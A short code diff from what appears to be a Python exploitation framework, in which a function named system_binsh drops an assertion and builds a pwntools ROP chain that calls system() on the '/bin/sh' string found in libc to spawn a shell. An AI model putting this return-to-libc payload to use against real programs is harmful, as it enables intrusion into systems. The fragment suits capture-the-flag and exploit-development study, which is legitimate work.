@@ -23,7 +23,6 @@ def system_binsh(state: PwnState) -> PwnState:
         Reference to the mutated ``PwnState``, with no direct property updates.
     """
     assert state.libc is not None
-    assert state.overwriter is not None
 
     rop = ROP([state.elf, state.libc])
     rop.system(next(state.libc.search(b"/bin/sh\x00")))
